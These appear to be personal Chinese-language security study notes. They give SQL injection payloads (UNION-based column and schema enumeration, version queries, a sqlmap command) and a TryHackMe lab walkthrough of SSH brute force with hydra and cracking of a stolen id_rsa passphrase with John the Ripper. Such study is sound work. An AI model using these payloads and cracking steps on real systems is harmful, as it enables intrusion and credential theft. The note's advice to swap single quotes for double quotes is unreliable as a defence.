# cheetsheet

## SQL Injection 隱碼攻擊

Introduction 
發生於應用程式之資料庫層的安全漏洞
是輸入的字串之中夾帶 SQL 指令
若程式未過濾，夾帶進去的指令會被資料庫 Server 認為是正常的 SQL 指令執行

1. 最簡單語法 
' or 1=1 # (# 代表後方皆省略)

2. UNION 可以將兩個 SELECT 結合在一起查詢
'UNION SELECT 1,2,3,4# (用這個可以慢慢找出欄位數)
'UNION SELECT ORDER BY 2# (與上方同理)

3. 系統資訊結構描述
一般 SQL 資料庫中都會有一個表格是 "系統資訊結構描述" ，表格名為 Information Schema，亦可透過 UNION 方式檢視 Table Name、Column Name
'UNION SELECT  TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS#

4. 查出資料庫版本、資料庫名稱
透過版本直接上網查是不是有已知漏洞可以打
'UNION SELECT @@version,database()#

5. SQL 檢測工具 - SQLMAP (未用過)
此工具用來檢視是否有 SQL Injection，程式將 SQL Injection 攻擊語法集結而成，透過此可對網站進行滲透
COMMAND:
sqlmap -u [URL] --dbs

strSQL = "SELECT * FROM users WHERE(name = '"+userName+"') and (pw = '"+passWord+"');"
userName = "1' OR '1'='1"
passWord = "1' OR '1'='1"
strSQL = "SELECT * FROM users WHERE(name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
==> strSQL = "SELECT * FROM users;" (因為後面的結果都是 True，所以就直接會變這樣)


預防方式建議:
1. 使用正規化的方式驗證過濾輸入值，可以將 SQL 指令過濾掉，或將單引號變換為雙引號
2. 在不需要使用到更新、插入資料時，資料庫以 view 的方式處理供使用者查詢資料
3. 將伺服器與資料庫部署在不同的機器上

參考:
https://www.slideshare.net/hugolu/sql-injection-61608454

###Tryhackme -Basic Penetration
1. Find the services exposed by the machine
nmap -A ip : 可以把這台機器上有開啟的 Port 掃出來
2. Find the hidden directory on the web server
Use dirsearch 
Command line: python3 dirsearch.py -u ip 
dirsearch 需要特別安裝，還沒探索完全部功能
3. Brute Force username
Use enum4linux
Command line: enum4linux ip -a
Kali 內建，看起來可以 enumeration 很多資訊出來
4. Brute Force password
Use hydra
Command line: hydra -l username -P wordlist ssh://ip
hydra 在 kali 內建，目前不知道為什麼是爆 ssh 不是 smb
5. How to get the other people in the machine and enter it
剛剛利用 hydra 有爆出了 jan 的密碼，ssh 登入 jan 的帳號，進入到此機器後開始機器漫遊，就會看到有另一個使用者 kay，但 hydra 沒有爆出他的密碼，但他有一個 pass.bak 的檔案看起來很香，可是卻沒有權限看這個檔案，因為這個檔案只有 kay 和 root 可以看，但現在登入的使用者是 jan 
但是有另一個 .ssh 檔案夾，等等去查裡面到底有些什麼，反正有個 id_rsa 好像是密鑰什麼的，可以利用這個登入 kay 帳號，前提要先把這個檔案夾 copy 一份到本地端，利用 scp 指令
Command line : ssh kay@ip -i id_rsa 
很不幸的是 id_rsa 這個檔案也需要密碼，必須 crack 出這個密碼
Use Johntheripper 進行 ssh key 密碼破解
將 ssh key 轉成 john 格式
Command line : python ssh2john.py id_rsa > john_hash
上一部是將 ssh key 轉換成 john 可以看懂的形式
Command line : john john_hash --wordlists=rockyou.txt
做完這一步，會拿到 kay 的 id_rsa 密碼，在利用同樣方式登入即可拿到最後一題的答案
